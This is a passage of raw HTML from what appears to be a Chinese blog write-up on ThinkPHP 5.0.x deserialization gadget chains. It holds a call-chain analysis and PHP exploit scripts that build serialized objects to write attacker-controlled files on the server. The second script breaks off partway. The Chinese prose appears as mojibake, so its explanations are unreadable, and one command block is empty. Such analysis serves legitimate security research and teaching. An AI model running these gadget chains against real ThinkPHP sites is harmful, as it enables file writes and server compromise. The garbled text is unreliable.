class="string">&quot;file_content&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> \think\<span class="title function_ invoke__">Process</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="FW2ï¼ˆå½±å“-5-0-0-5-0-3ï¼‰"><a href="#FW2ï¼ˆå½±å“-5-0-0-5-0-3ï¼‰" class="headerlink" title="FW2ï¼ˆå½±å“ 5.0.0 - 5.0.3ï¼‰"></a>FW2ï¼ˆå½±å“ 5.0.0 - 5.0.3ï¼‰</h2><h3 id="åŸºæœ¬ä¿¡æ¯-5"><a href="#åŸºæœ¬ä¿¡æ¯-5" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><ul>
<li><p><strong>å½±å“èŒƒå›´</strong> ï¼š5.0.0 - 5.0.3</p>
</li>
<li><p><strong>ç”Ÿæˆå‘½ä»¤</strong> ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–å¯¹è±¡</strong> ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPFW2.svg"
                      alt="TPFW2"
                ></p>
</li>
<li><p><strong>ååºåˆ—åŒ–è°ƒç”¨é“¾</strong> ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">think\Process-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">stop</span>()</span><br><span class="line">    â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) == <span class="literal">false</span>              <span class="comment">// $status ä¸ºé»˜è®¤å€¼ &quot;ready&quot;</span></span><br><span class="line">    â”œâ”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateStatus</span>(<span class="literal">false</span>)                    <span class="comment">// åŒæ · $status != &quot;started&quot; â†’ return</span></span><br><span class="line">    â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>]) == <span class="literal">true</span></span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">close</span>()</span><br><span class="line">            â””â”€â”€ <span class="variable language_">$this</span>-&gt;processPipes-&gt;<span class="title function_ invoke__">close</span>()</span><br><span class="line">                <span class="comment">// $processPipes ä¸º think\model\Relationï¼Œæ—  close æ–¹æ³•ï¼Œè§¦å‘ __call</span></span><br><span class="line"></span><br><span class="line">think\model\Relation-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;close&quot;</span>, [])</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query &amp;&amp; <span class="variable language_">$this</span>-&gt;type === <span class="built_in">self</span>::<span class="variable constant_">HAS_MANY</span>)</span><br><span class="line">    â””â”€â”€ <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;where)) == <span class="literal">true</span>              <span class="comment">// âœ… è®¾ç½® $where = &quot;file_content&quot;</span></span><br><span class="line">        â””â”€â”€ <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;where)</span><br><span class="line">            <span class="comment">// $query = think\console\Outputï¼Œæ²¡æœ‰ where æ–¹æ³•ï¼Œè§¦å‘ __call</span></span><br><span class="line"></span><br><span class="line">think\console\Output-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;where&quot;</span>, [<span class="string">&#x27;file_content&#x27;</span>])</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles)) == <span class="literal">true</span>     <span class="comment">// âœ… $styles = [&#x27;where&#x27;]</span></span><br><span class="line">    â”œâ”€â”€ <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>)                 <span class="comment">// [&#x27;file_content&#x27;] â†’ [&#x27;where&#x27;, &#x27;file_content&#x27;]</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], [<span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;file_content&#x27;</span>])</span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">block</span>(<span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;file_content&#x27;</span>)</span><br><span class="line">            â””â”€â”€ <span class="title function_ invoke__">writeln</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>)</span><br><span class="line">                â””â”€â”€ <span class="title function_ invoke__">write</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>)</span><br><span class="line">                    â””â”€â”€ <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>)</span><br><span class="line">                        <span class="comment">// $handle = think\session\driver\Memcache â†’ write</span></span><br><span class="line"></span><br><span class="line">think\session\driver<span class="title class_">\Memcache</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">â””â”€â”€ <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>, <span class="literal">true</span>, <span class="number">0</span>, <span class="number">3600</span>)</span><br><span class="line">    <span class="comment">// $handler = think\cache\driver\Memcached â†’ set()</span></span><br><span class="line"></span><br><span class="line">think\cache\driver<span class="title class_">\Memcached</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) == <span class="literal">true</span>     <span class="comment">// âœ… ç¬¬ä¸€æ¬¡å†™å…¥ï¼Œè®¾ç½® $first = true</span></span><br><span class="line">    â””â”€â”€ <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)</span><br><span class="line">    â””â”€â”€ <span class="variable">$expire</span> = <span class="number">0</span> == <span class="variable">$expire</span> ? <span class="number">0</span> : <span class="title function_ invoke__">time</span>() + <span class="variable">$expire</span></span><br><span class="line">    â””â”€â”€ <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)     <span class="comment">// File::set ç¬¬ä¸€æ¬¡å†™å…¥ï¼ˆvalue ä¸å¯æ§ï¼‰</span></span><br><span class="line">        â”œâ”€â”€ ç”Ÿæˆç¼“å­˜æ–‡ä»¶è·¯å¾„ <span class="variable">$filename</span></span><br><span class="line">        â”œâ”€â”€ <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="literal">true</span>)</span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)</span><br><span class="line">    â””â”€â”€ <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>)       <span class="comment">// ç¬¬äºŒæ¬¡è°ƒç”¨ setï¼ˆvalue å¯æ§ï¼‰</span></span><br><span class="line"></span><br><span class="line">think\cache\driver<span class="title class_">\Memcached</span>::<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>)</span><br><span class="line">â””â”€â”€ <span class="variable">$value</span> = <span class="variable">$key</span> <span class="comment">// âœ… $key = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27; å¯æ§</span></span><br><span class="line">â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&quot;tag_&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag), <span class="variable">$value</span>, <span class="number">0</span>)</span><br><span class="line">    â””â”€â”€ think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">set</span>(name = <span class="string">&quot;tag_xxx&quot;</span>, value = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">        â”œâ”€â”€ <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)        <span class="comment">// âœ… å†…å®¹å¯æ§ â†’ æ–‡ä»¶å†™å…¥åŸå§‹æ•°æ®</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="è°ƒç”¨é“¾åˆ†æ-5"><a href="#è°ƒç”¨é“¾åˆ†æ-5" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p>FW2 ä¸ FW1 çš„æ•´ä½“è¿‡ç¨‹åŸºæœ¬ä¸Šæ˜¯ä¸€è‡´çš„ï¼Œå”¯ä¸€çš„ä¸åŒç‚¹æ˜¯ FW2 å°† FW1 çš„ <code>think\model\relation\HasMany</code> æ›¿æ¢ä¸ºäº† <code>think\model\Relation</code>ã€‚</p>
<p>è¿™æ˜¯å› ä¸ºåœ¨ 5.0.3 ä¸­ <code>Relation</code> ç±»çš„ <code>__call</code> æ–¹æ³•å¯ä»¥ç›´æ¥è°ƒç”¨åˆ° <code>$this-&gt;query-&gt;where</code>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">HAS_MANY</span>         = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">HAS_MANY</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;where)) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;where); <span class="comment">// ğŸ‘ˆ ä½¿ç”¨è¿™ä¸ªæ›´æ–¹ä¾¿ä¸€äº›</span></span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) &#123;</span><br><span class="line">                    <span class="comment">// å¯¹åº” 5.0.4+ çš„ HasMany çš„ baseQuery</span></span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">             <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>è€Œ 5.0.4+ çš„ <code>Relation</code> ç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒçš„ <code>__call</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>$this-&gt;baseQuery</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query) &#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡ŒåŸºç¡€æŸ¥è¯¢</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">baseQuery</span>();</span><br><span class="line">        <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>è€Œ <code>$this-&gt;baseQuery</code> å‡½æ•°æ¥è‡ªäº <code>Relation</code> å…·ä½“çš„å®ç°ç±»ã€‚è€Œ FW1 é‡‡ç”¨çš„æ˜¯ <code>HasMany</code>ï¼Œå› æ­¤ä¼šè°ƒç”¨ <code>$this-&gt;baseQuery-&gt;where</code>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ‰§è¡ŒåŸºç¡€æŸ¥è¯¢ï¼ˆè¿›æ‰§è¡Œä¸€æ¬¡ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">baseQuery</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;baseQuery)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) &#123;</span><br><span class="line">            <span class="comment">// å…³è”æŸ¥è¯¢å¸¦å…¥å…³è”æ¡ä»¶</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;baseQuery = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤–ä¸€ç‚¹ä¸åŒçš„æ˜¯ <code>think\cache\driver\File-&gt;set</code> å†™å…¥æ–‡ä»¶éƒ¨åˆ†ã€‚åœ¨ 5.0.3 ä¸­ï¼Œæˆ‘ä»¬çš„å¯æ§æ•°æ® <code>$data</code> æ˜¯æ‹¼æ¥åœ¨ PHP è„šæœ¬å†…éƒ¨çš„ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="variable">$data</span> . <span class="string">&quot;\n?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure></div>

<p>ä¸¤æ¬¡æ–‡ä»¶å†™å…¥å†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000b:1;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000s:27:&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è€Œåœ¨ 5.0.4+ çš„ <code>think\cache\driver\File-&gt;set</code> å†™å…¥æ–‡ä»¶éƒ¨åˆ†ï¼Œå¯æ§æ•°æ® <code>$data</code> æ˜¯æ‹¼æ¥åœ¨ PHP è„šæœ¬åé¢çš„ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure></div>

<p>ä¸¤æ¬¡æ–‡ä»¶å†™å…¥å†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000</span></span><br><span class="line"><span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line">b:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000</span></span><br><span class="line"><span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line">s:<span class="number">27</span>:<span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨è„šæœ¬-5"><a href="#åˆ©ç”¨è„šæœ¬-5" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>\<span class="title class_">HasMany</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processPipes</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processInformation</span> = [<span class="string">&#x27;running&#x27;</span> =&gt; <span class="literal">true</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processPipes = <span class="keyword">new</span> <span class="title class_">HasMany</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Relation</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">stdClass</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasMany</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$localKey</span> = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$foreignKey</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;foreignKey = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125; = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">styles</span> = [</span><br><span class="line">            &#x27;<span class="title class_">where</span>&#x27;</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> \think\session\driver\<span class="title function_ invoke__">Memcache</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> 